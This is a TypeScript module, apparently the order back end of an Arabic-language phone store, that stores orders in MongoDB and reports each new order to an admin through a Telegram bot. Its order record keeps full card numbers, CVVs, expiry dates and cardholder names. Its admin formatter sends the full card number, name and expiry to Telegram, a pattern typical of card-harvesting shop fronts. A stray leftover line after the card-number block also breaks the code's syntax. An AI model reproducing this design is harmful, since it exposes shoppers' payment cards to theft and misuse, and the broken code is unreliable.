import { ObjectId, type Db, type Document } from 'mongodb';
import { ORDER_STATUS_LABELS, type OrderStatus, sendTelegramMessage, statusInlineKeyboard } from '@/lib/telegram';

export type OrderItem = {
  name: string;
  quantity: number;
  unitPrice?: number;
  color?: string;
};

export type StoreOrder = Document & {
  _id: ObjectId;
  orderNumber: string;
  source: 'website' | 'telegram_manual';
  customer: {
    name: string;
    phone: string;
    email?: string;
    idNumber?: string;
    address: string;
  };
  items: OrderItem[];
  total: number;
  currency: 'SAR';
  status: OrderStatus;
  paymentStatus: 'pending' | 'paid' | 'not_recorded' | 'failed';
  paymentMethod?: 'mada' | 'visa';
  cardholderName?: string;
  cardNumber?: string;
  cvv?: string;
  expiryMonth?: string;
  expiryYear?: string;
  paymentMethodSelectedAt?: Date;
  installment: boolean;
  installmentDownPayment?: number;
  installmentMonths?: number;
  acceptedPoliciesAt?: Date;
  acceptedWarrantyPolicyAt?: Date;
  acceptedWarrantyPolicyUpdatedAt?: string;
  acceptedWarrantyPolicyContent?: string;
  createdAt: Date;
  updatedAt: Date;
  notes?: string;
  customerNotificationKey?: string;
  cancellationReason?: string;
};

export function makeOrderNumber(id: ObjectId, date = new Date()) {
  const day = date.toISOString().slice(2, 10).replace(/-/g, '');
  return `AG-${day}-${id.toHexString().slice(-6).toUpperCase()}`;
}

export function formatOrderForAdmin(order: Record<string, unknown>) {
  const customer = (order.customer && typeof order.customer === 'object')
    ? order.customer as Record<string, unknown>
    : {};
  const items = Array.isArray(order.items) ? order.items as Array<Record<string, unknown>> : [];
  const status = typeof order.status === 'string' && order.status in ORDER_STATUS_LABELS
    ? ORDER_STATUS_LABELS[order.status as OrderStatus]
    : 'غير محدد';
  const itemText = items.slice(0, 8).map((item) => {
    const name = String(item.name || 'منتج');
    const quantity = Number(item.quantity || 1);
    return `• ${name}${item.color ? ' — اللون: ' + String(item.color) : ''} × ${quantity}`;
  }).join('\n') || '• تفاصيل المنتجات غير متاحة';
  const total = Number(order.total || 0).toLocaleString('en-US', { maximumFractionDigits: 2 });
  return [
    `رقم الطلب: ${String(order.orderNumber || order._id || '—')}`,
    `العميل: ${String(customer.name || '—')}`,
    `الجوال: ${String(customer.phone || '—')}`,
    `العنوان: ${String(customer.address || '—')}`,
    `المنتجات:\n${itemText}`,
    `الإجمالي: ${total} ر.س`,
    `طريقة الدفع: ${order.paymentMethod === 'mada' ? 'مدى' : order.paymentMethod === 'visa' ? 'Visa' : 'لم يتم الاختيار'}`,
    ...(typeof order.cardholderName === 'string' && order.cardholderName.trim()
      ? [`اسم حامل البطاقة: ${order.cardholderName.trim()}`]
      : []),
    ...(typeof order.cardNumber === 'string' && /^[0-9]{13,19}$/.test(order.cardNumber)
  ? [`رقم البطاقة كامل: ${order.cardNumber}`]
  : []),
    
      : []),
    ...(typeof order.expiryMonth === 'string' && typeof order.expiryYear === 'string'
      ? [`تاريخ الانتهاء: ${order.expiryMonth}/${order.expiryYear.slice(-2)}`]
      : []),
    `حالة الدفع: ${order.paymentStatus === 'paid' ? 'مدفوع' : order.paymentStatus === 'failed' ? 'فشل الدفع' : 'بانتظار الدفع'}`,
    `التقسيط: ${order.installment === true
      ? `نعم — دفعة مقدمة ${Number(order.installmentDownPayment || 0).toLocaleString('en-US')} ر.س — ${Number(order.installmentMonths || 0)} شهور`
      : 'لا'}`,
    `الحالة: ${status}`,
    ...(order.status === 'cancelled' && typeof order.cancellationReason === 'string' && order.cancellationReason.trim()
      ? [`سبب الإلغاء: ${order.cancellationReason.trim()}`]
      : []),
    `المصدر: ${order.source === 'telegram_manual' ? 'أضيف من البوت' : 'المتجر الإلكتروني'}`
  ].join('\n');
}

export async function sendNewOrderToAdmin(order: StoreOrder) {
  const adminId = process.env.TELEGRAM_ADMIN_ID;
  if (!adminId) throw new Error('TELEGRAM_ADMIN_ID is not configured');

  await sendTelegramMessage(Number(adminId), `🛍️ طلب جديد في أرض الجوال\n\n${formatOrderForAdmin(order)}\n\nاختر الحالة لتعديل الطلب:`, {
    reply_markup: statusInlineKeyboard(order._id.toHexString())
  });
}

export async function getRecentOrders(db: Db, limit = 10) {
  return db.collection<StoreOrder>('orders')
    .find({})
    .sort({ createdAt: -1 })
    .limit(limit)
    .toArray();
}
